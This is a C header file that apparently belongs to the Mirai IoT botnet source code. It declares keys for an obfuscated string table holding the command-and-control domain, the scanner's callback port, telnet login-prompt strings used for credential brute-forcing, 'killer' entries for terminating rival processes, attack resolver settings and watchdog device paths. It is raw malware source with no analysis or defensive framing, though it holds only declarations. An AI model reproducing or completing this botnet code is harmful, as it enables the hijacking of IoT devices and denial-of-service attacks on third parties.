#pragma once

#include <stdint.h>
#include "includes.h"

struct table_value {
    char *val;
    uint16_t val_len;
#ifdef DEBUG
    BOOL locked;
#endif
};

#define TABLE_DOMAIN			1
#define TABLE_SCAN_DOMAIN		2
#define TABLE_SCAN_CB_PORT		3

#define TABLE_EXEC_SUCCESS		4

#define TABLE_KILLER_PROC		5
#define TABLE_KILLER_EXE		6
#define TABLE_KILLER_FD			7
#define TABLE_KILLER_TCP		8
#define TABLE_KILLER_MAPS		9
#define TABLE_MEM_ROUTE			10
#define TABLE_MEM_ASSWORD		11
#define TABLE_KILLER_STATUS		12

#define TABLE_ATK_VSE			13
#define TABLE_ATK_RESOLVER		14
#define TABLE_ATK_NSERV			15

#define TABLE_SCAN_OGIN			16
#define TABLE_SCAN_ENTER		17
#define TABLE_SCAN_ASSWORD		18
#define TABLE_SCAN_QUERY		19
#define TABLE_SCAN_RESP			20
#define TABLE_SCAN_NCORRECT		21
#define TABLE_SCAN_ENABLE		22
#define TABLE_SCAN_SYSTEM		23
#define TABLE_SCAN_SHELL		24
#define TABLE_SCAN_SH			25

#define TABLE_MISC_RAND			26
#define TABLE_MISC_DOG			27
#define TABLE_MISC_DOG1			28
#define TABLE_MISC_DOG2			29
#define TABLE_MISC_DOG3			30
#define TABLE_MISC_DOG4			31
#define TABLE_MISC_DOG5			32
#define TABLE_MISC_DOG6			33

#define TABLE_MAX_KEYS			34

void table_init(void);
void table_unlock_val(uint8_t);
void table_lock_val(uint8_t); 
char *table_retrieve_val(int, int *);

static void add_entry(uint8_t, char *, int);
static void toggle_obf(uint8_t);
